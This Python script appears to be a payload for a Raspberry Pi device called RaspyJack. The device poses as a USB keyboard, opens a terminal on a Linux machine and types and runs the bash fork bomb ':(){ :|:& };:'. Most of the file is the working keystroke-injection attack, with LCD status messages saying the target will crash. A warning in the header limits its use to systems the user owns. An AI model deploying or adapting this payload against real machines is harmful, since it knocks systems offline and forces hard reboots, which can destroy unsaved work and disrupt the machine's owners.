#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Linux Fork Bomb**
=======================================================
A highly disruptive HID attack that opens a terminal on a Linux
machine and executes the classic bash fork bomb.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. It will render the target
machine unresponsive and will require a hard reboot. Use with
extreme caution and only on systems you own.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# --- Display Functions ---
def show_message(lines, color="red"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 30
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries not available. Cannot run HID attack.", file=sys.stderr)
        return

    show_message(["!!! WARNING !!!", "Fork Bomb", "This will crash", "the target!"])
    time.sleep(4)
    show_message(["HID Attack:", "Linux Fork Bomb"])
    
    if not hid_helper.is_hid_gadget_enabled:
        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
        time.sleep(3)
        return

    # The classic bash fork bomb
    fork_bomb = ":(){ :|:& };:"
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_control, hid_helper.keyboard.left_alt, hid_helper.keyboard.t) # CTRL-ALT t
        time.sleep(0.75)
        hid_helper.type_string(fork_bomb)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.2)
        
        show_message(["Attack Sent!", "Fork Bomb"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        if HARDWARE_LIBS_AVAILABLE:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Attack payload finished.")
